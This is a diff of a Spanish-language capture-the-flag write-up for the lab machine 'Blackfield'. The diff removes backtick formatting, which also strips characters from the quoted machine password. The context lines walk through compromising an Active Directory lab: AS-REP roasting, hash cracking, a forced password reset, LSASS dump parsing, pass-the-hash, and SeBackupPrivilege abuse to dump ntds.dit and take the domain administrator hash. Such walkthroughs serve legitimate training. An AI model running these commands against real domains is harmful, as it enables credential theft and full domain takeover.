@@ -45,13 +45,13 @@ image:
   
 ## Descripción
 
-`Backfield` es una máquina `hard windows` que presenta errores de configuración en `Windows` y `Active Directory`. Se utiliza el acceso `anónimo/invitado` a un recurso compartido de `SMB` para enumerar `usuarios`. Una vez que se encuentra un usuario con la `preautenticación de Kerberos` deshabilitada, esto nos permite realizar un ataque `ASREPRoasting`. Este ataque nos permite recuperar un `hash` del material encriptado contenido en el `AS-REP`, el cual puede ser sometido a un ataque de `fuerza bruta offline` para obtener la `contraseña` en texto plano. Con este `usuario`, podemos acceder a un recurso compartido de `SMB` que contiene artefactos `forenses`, incluido un volcado del proceso `lsass`. Este volcado contiene un `nombre de usuario` y una `contraseña` para un usuario con privilegios de `WinRM`, quien también es miembro del grupo de `Backup Operators`. Los privilegios conferidos por este `grupo privilegiado` se utilizan para extraer la `base de datos de Active Directory` y recuperar el `hash` del `administrador de dominio principal`
+Backfield es una máquina hard windows que presenta errores de configuración en Windows y Active Directory. Se utiliza el acceso anónimo/invitado a un recurso compartido de SMB para enumerar usuarios. Una vez que se encuentra un usuario con la preautenticación de Kerberos deshabilitada, esto nos permite realizar un ataque ASREPRoasting. Este ataque nos permite recuperar un hash del material encriptado contenido en el AS-REP, el cual puede ser sometido a un ataque de fuerza bruta offline para obtener la contraseña en texto plano. Con este usuario, podemos acceder a un recurso compartido de SMB que contiene artefactos forenses, incluido un volcado del proceso lsass. Este volcado contiene un nombre de usuario y una contraseña para un usuario con privilegios de WinRM, quien también es miembro del grupo de Backup Operators. Los privilegios conferidos por este grupo privilegiado se utilizan para extraer la base de datos de Active Directory y recuperar el hash del administrador de dominio principal
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `windows` suele ser `128`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la máquina está activa y se determina su sistema operativo, el ttl de las máquinas windows suele ser 128, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping -c 3 10.129.229.17
@@ -67,7 +67,7 @@ rtt min/avg/max/mdev = 36.974/38.107/39.177/0.900 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap
+Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.229.17 -oG openPorts
@@ -103,7 +103,7 @@ Nmap done: 1 IP address (1 host up) scanned in 26.46 seconds
            Raw packets sent: 131080 (5.768MB) | Rcvd: 29 (1.396KB)
 ```
 
-Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p 53,88,135,389,445,593,3268,5985 10.129.229.17 -oN services
@@ -139,14 +139,14 @@ Nmap done: 1 IP address (1 host up) scanned in 52.13 seconds
 
 ### Smb Enumeration
 
-`Obtenemos` el `nombre` de la `máquina` y el `dominio`
+Obtenemos el nombre de la máquina y el dominio
 
 ```
 # netexec smb 10.129.229.17                                              
 SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 ```
 
-Los añadimos al `/etc/hosts`
+Los añadimos al /etc/hosts
 
 ```
 127.0.0.1       localhost
@@ -159,7 +159,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-`Listamos` recursos compartidos por `smb`
+Listamos recursos compartidos por smb
 
 ```
 # netexec smb 10.129.229.17 -u 'guest' -p '' --shares 
@@ -177,7 +177,7 @@ SMB         10.129.229.17   445    DC01             profiles$       READ
 SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share 
 ```
 
-Nos `conectamos` con `smbclient` a `profiles$` y obtenemos un `listado` de `nombres` de `usuario`
+Nos conectamos con smbclient a profiles$ y obtenemos un listado de nombres de usuario
 
 ```
 # smbclient --no-pass //10.129.229.17/profiles$          
@@ -506,7 +506,7 @@ smb: \> dir
 
 ### Kerberos Enumeration
 
-`Enumeramos usuarios` válidos usando el listado de usuarios obtenidos anteriormente
+Enumeramos usuarios válidos usando el listado de usuarios obtenidos anteriormente
 
 ```
 # kerbrute userenum --dc 10.129.153.116 -d BLACKFIELD.local users -t 50              
@@ -528,7 +528,7 @@ Version: v1.0.3 (9dad6e1) - 10/05/24 - Ronnie Flathers @ropnop
 2024/10/05 22:28:28 >  Done! Tested 314 usernames (3 valid) in 35.749 seconds
 ```
 
-Efectuamos un `ASREPRoast Attack` usando el listado de usuarios válidos y `obtenemos` un `hash` debido a que el usuario `support` tiene el `DONT_REQUIRE_PREAUTH` seteado
+Efectuamos un ASREPRoast Attack usando el listado de usuarios válidos y obtenemos un hash debido a que el usuario support tiene el DONT_REQUIRE_PREAUTH seteado
 
 ```
 # impacket-GetNPUsers BLACKFIELD.Local/ -usersfile validated_domain_users
@@ -541,7 +541,7 @@ $krb5asrep$23$support@BLACKFIELD.LOCAL:f603e5cdfe6e4be6e892c0c6d8c4e31c$4cf63f7f
 [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-`Metemos` el `hash` del `usuario` en un `archivo` y lo `crackeamos` con `john`
+Metemos el hash del usuario en un archivo y lo crackeamos con john
 
 ```
 # john -w:/usr/share/wordlists/rockyou.txt hash  
@@ -558,43 +558,43 @@ Session completed.
 
 ## Intrusión
 
-Con `bloodhound-python` podemos `listar información` de la máquina víctima sin necesidad de conectarnos
+Con bloodhound-python podemos listar información de la máquina víctima sin necesidad de conectarnos
 
 ```
 # bloodhound-python -c All -u 'support' -p '#00^BlackKnight' -ns 10.129.153.116 -d BLACKFIELD.Local -v --zip 
 ```
 
-Ejecutamos `neo4j` para proceder a una `enumeración` más `profunda` del `directorio activo`
+Ejecutamos neo4j para proceder a una enumeración más profunda del directorio activo
 
 ```
 # sudo neo4j console
 ```
 
-Nos dirigimos a `http://localhost:7474` y `rellenamos` los `datos` con las credenciales `neo4j:neo4j`
+Nos dirigimos a http://localhost:7474 y rellenamos los datos con las credenciales neo4j:neo4j
 
 ![](/assets/img/Blackfield/image_1.png)
 
-`Introducimos` una `contraseña`
+Introducimos una contraseña
 
 ![](/assets/img/Blackfield/image_2.png)
 
-Nos `abrimos` el `bloodhound` y nos `logueamos`
+Nos abrimos el bloodhound y nos logueamos
 
 ![](/assets/img/Blackfield/image_3.png)
 
-Nos vamos al `bloodhound` y pulsamos en `Upload data`
+Nos vamos al bloodhound y pulsamos en Upload data
 
 ![](/assets/img/Blackfield/image_4.png)
 
-Una vez subidos los `datos` pulsamos en `First Degree Object Control`
+Una vez subidos los datos pulsamos en First Degree Object Control
 
 ![](/assets/img/Blackfield/image_5.png)
 
-Podemos `obtener` la `contraseña` del usuario `audit2020` mediante un `ForceChangePassword`
+Podemos obtener la contraseña del usuario audit2020 mediante un ForceChangePassword
 
 ![](/assets/img/Blackfield/image_6.png)
 
-Le `cambiamos` la `contraseña`
+Le cambiamos la contraseña
 
 ![](/assets/img/Blackfield/image_7.png)
 
@@ -602,7 +602,7 @@ Le `cambiamos` la `contraseña`
 # net rpc password "audit2020" "newP@ssword2022" -U "BLACKFIELD.local"/"support"%"#00^BlackKnight" -S "DC01.BLACKFIELD.local"
 ```
 
-`Validamos` las `credenciales`
+Validamos las credenciales
 
 ```
 # netexec smb 10.129.153.116 -u audit2020 -p 'newP@ssword2022'    
@@ -610,7 +610,7 @@ SMB         10.129.153.116  445    DC01             [*] Windows 10 / Server 2019
 SMB         10.129.153.116  445    DC01             [+] BLACKFIELD.local\audit2020:newP@ssword2022 
 ```
 
-Vemos que este usuario tiene `acceso` a la carpeta `forensic`
+Vemos que este usuario tiene acceso a la carpeta forensic
 
 ```
 # netexec smb 10.129.153.116 -u audit2020 -p 'newP@ssword2022' --shares
@@ -628,7 +628,7 @@ SMB         10.129.153.116  445    DC01             profiles$       READ
 SMB         10.129.153.116  445    DC01             SYSVOL          READ            Logon server share 
 ```
 
-Nos `conectamos` por `smb` y `descargamos` todo el `contenido` que se comparte
+Nos conectamos por smb y descargamos todo el contenido que se comparte
 
 ```
 # smbclient -U 'audit2020%newP@ssword2022' //10.129.153.116/forensic
@@ -638,7 +638,7 @@ smb: \> RECURSE ON
 smb: \> mget *
 ```
 
-Vemos un dump de `LSASS`, el cual es un servicio crucial en `Windows` que maneja la `autenticación local y remota`, validando `inicios de sesión, tokens de acceso y otros aspectos de la seguridad`
+Vemos un dump de LSASS, el cual es un servicio crucial en Windows que maneja la autenticación local y remota, validando inicios de sesión, tokens de acceso y otros aspectos de la seguridad
 
 ```
 # ls
@@ -646,7 +646,7 @@ Vemos un dump de `LSASS`, el cual es un servicio crucial en `Windows` que maneja
  ctfmon.zip    dllhost.zip   lsass.DMP     mmc.zip     ServerManager.zip
 ```
 
-`Extraemos` las `credenciales` del `dumpeo` del `lsass`
+Extraemos las credenciales del dumpeo del lsass
 
 ```
 # pypykatz lsa minidump lsass.DMP            
@@ -706,7 +706,7 @@ luid 365835
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [5950b]==
 		username DC01$
@@ -738,7 +738,7 @@ luid 365493
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [593b5]==
 		username DC01$
@@ -844,7 +844,7 @@ luid 40310
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [9d76]==
 		username DC01$
@@ -876,7 +876,7 @@ luid 40232
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [9d28]==
 		username DC01$
@@ -908,7 +908,7 @@ luid 996
 	== Kerberos ==
 		Username: dc01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [3e4]==
 		username DC01$
@@ -940,7 +940,7 @@ luid 24410
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [5f5a]==
 		username DC01$
@@ -1007,7 +1007,7 @@ luid 366665
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [59849]==
 		username DC01$
@@ -1039,7 +1039,7 @@ luid 366649
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [59839]==
 		username DC01$
@@ -1123,7 +1123,7 @@ luid 24405
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [5f55]==
 		username DC01$
@@ -1155,7 +1155,7 @@ luid 24294
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [5ee6]==
 		username DC01$
@@ -1187,7 +1187,7 @@ luid 24282
 	== Kerberos ==
 		Username: DC01$
 		Domain: BLACKFIELD.local
-		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
+		Password: &SYVE+<ynuQl;gvEE!f$DoO0F+,gP@Pfraz4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En khb'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
 		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
 	== WDIGEST [5eda]==
 		username DC01$
@@ -1256,7 +1256,7 @@ luid 999
 		sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
 ```
 
-Nos conectamos a la máquina víctima como el usuario svc_backup haciendo `Pass The Hast` mediante evil-winrm
+Nos conectamos a la máquina víctima como el usuario svc_backup haciendo Pass The Hast mediante evil-winrm
 
 ```
 # evil-winrm -i 10.129.153.116 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d' 
@@ -1274,7 +1274,7 @@ blackfield\svc_backup
 
 ## Privilege Escalation
 
-`Listamos` los `privilegios` que tiene nuestro usuario y vemos que pertenece al grupo de `Backup Operators`, voy a estar siguiendo los pasos de [https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)
+Listamos los privilegios que tiene nuestro usuario y vemos que pertenece al grupo de Backup Operators, voy a estar siguiendo los pasos de [https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)
 
 ```
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all
@@ -1325,7 +1325,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-`Creamos` un `fichero` llamado `vss.dsh`
+Creamos un fichero llamado vss.dsh
 
 ```
 set context persistent nowriters
@@ -1336,13 +1336,13 @@ create
 expose %test% z:
 ```
 
-`Cambiamos` el `formato` del `archivo`
+Cambiamos el formato del archivo
 
 ```
 # unix2dos vss.dsh
 ```
 
-Como formamos parte del grupo `Backup Operators` tenemos el `privilegios` de `restaurar` y hacer `copias` de `archivos` y `directorios`. Para explotar esto, nos descargamos las `DLL` [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug) y los subimos a la máquina víctima junto con el archivo `.dsh`, para ello debemos conectarnos desde el `mismo directorio` donde se encuentran estos archivos
+Como formamos parte del grupo Backup Operators tenemos el privilegios de restaurar y hacer copias de archivos y directorios. Para explotar esto, nos descargamos las DLL [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug) y los subimos a la máquina víctima junto con el archivo .dsh, para ello debemos conectarnos desde el mismo directorio donde se encuentran estos archivos
 
 ```
 # evil-winrm -i 10.129.153.116 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'  
@@ -1376,14 +1376,14 @@ Info: Uploading /home/justice-reaper/Downloads/vss.dsh to C:\programdata\vss.dsh
 Info: Upload successful!
 ```
 
-`Importamos` los `módulos`
+Importamos los módulos
 
 ```
 *Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeCmdLets.dll
 *Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeUtils.dll
 ```
 
-Ejecutamos ` `
+Ejecutamos  
 
 ```
 *Evil-WinRM* PS C:\programdata> diskshadow /s c:\\programdata\\vss.dsh
@@ -1423,20 +1423,20 @@ Number of shadow copies listed: 1
 The  drive letter is already in use.
 ```
 
-`Copiamos` el archivo `ntds` a la `ubicación actual`
+Copiamos el archivo ntds a la ubicación actual
 
 ```
 *Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\programdata\\ntds.dit
 ```
 
-`Copiamos` el archivo `system`
+Copiamos el archivo system
 
 ```
 *Evil-WinRM* PS C:\programdata> reg save HKLM\SYSTEM C:\\programdata\\SYSTEM
 The operation completed successfully.
 ```
 
-`Descargamos` ambos `archivos`
+Descargamos ambos archivos
 
 ```
 *Evil-WinRM* PS C:\programdata> download ntds.dit
@@ -1451,7 +1451,7 @@ Info: Downloading C:\programdata\SYSTEM to SYSTEM
 Info: Download successful!
 ```
 
-Ahora extraemos los hashes de `NTDS.dit` con `SYSTEM` como clave. Nos descargamos el `NTDS.dit` en vez de la `SAM` debido a que el `NTDS.dit` es la `base de datos del active directory` mientras que la sam es la `base de datos de cuentas locales`, como estamos ante un `active directory` nos descargamos el ntds.dit. El archivo `SYSTEM` también es necesario debido a que almacena las `claves de cifrado` que se utilizan para desencriptar los hashes de contraseñas almacenados en los archivos `SAM` y `NTDS.dit`
+Ahora extraemos los hashes de NTDS.dit con SYSTEM como clave. Nos descargamos el NTDS.dit en vez de la SAM debido a que el NTDS.dit es la base de datos del active directory mientras que la sam es la base de datos de cuentas locales, como estamos ante un active directory nos descargamos el ntds.dit. El archivo SYSTEM también es necesario debido a que almacena las claves de cifrado que se utilizan para desencriptar los hashes de contraseñas almacenados en los archivos SAM y NTDS.dit
 
 ```
 # impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
@@ -1470,7 +1470,7 @@ audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa
 support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
 ```
 
-`Validamos` las `credenciales`
+Validamos las credenciales
 
 ```
 netexec winrm 10.129.153.116 -u administrator -H 184fb5e5178480be64824d4cd53b99ee   
@@ -1478,7 +1478,7 @@ WINRM       10.129.153.116  5985   DC01             [*] Windows 10 / Server 2019
 WINRM       10.129.153.116  5985   DC01             [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
 ```
 
-Nos `conectamos` a la `máquina víctima` como el usuario `administrador`
+Nos conectamos a la máquina víctima como el usuario administrador
 
 ```
 evil-winrm -i 10.129.153.116 -u administrator -H '184fb5e5178480be64824d4cd53b99ee'  
